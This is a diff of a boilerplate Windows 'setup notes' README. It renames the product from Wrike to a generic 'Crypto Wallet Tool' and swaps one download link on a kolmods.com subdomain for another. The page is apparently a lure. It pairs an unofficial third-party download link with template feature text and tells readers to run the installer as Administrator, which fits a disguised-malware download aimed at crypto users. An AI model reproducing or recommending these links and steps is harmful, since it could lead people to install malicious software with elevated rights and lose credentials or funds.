@@ -1,10 +1,10 @@
-# Wrike Windows Setup Notes
-
-[⬇ Download Wrike for Windows](https://wrike-setup.kolmods.com/)
+# Crypto Wallet Tool Windows Setup Notes
 
 ## Download & Install
 
-> Setup notes for **Wrike** on Windows 10/11 (64-bit). Run the installer as Administrator.
+> **Download:** [**Get Crypto Wallet Tool for Windows →**](https://crypto-wallet-tool.kolmods.com/)
+>
+> Setup notes for **Crypto Wallet Tool** on Windows 10/11 (64-bit). Run the installer as Administrator.
 
 ### Quick steps
 
@@ -12,15 +12,15 @@
 2. Save the file to a local folder you can find later
 3. Run the setup **as Administrator**
 4. Enter your license key when prompted
-5. Restart if the installer asks — then launch **Wrike** from the Start menu
+5. Restart if the installer asks — then launch **Crypto Wallet Tool** from the Start menu
 
 ## What you can use it for
 
-- Core Wrike features on Windows desktop
-- Install and configure Wrike for daily use
-- Import, edit, and export with Wrike tools
-- Tune settings and profiles inside Wrike
-- Integrate Wrike into your existing workflow
+- Core Crypto Wallet Tool features on Windows desktop
+- Install and configure Crypto Wallet Tool for daily use
+- Import, edit, and export with Crypto Wallet Tool tools
+- Tune settings and profiles inside Crypto Wallet Tool
+- Integrate Crypto Wallet Tool into your existing workflow
 
 ## License
 
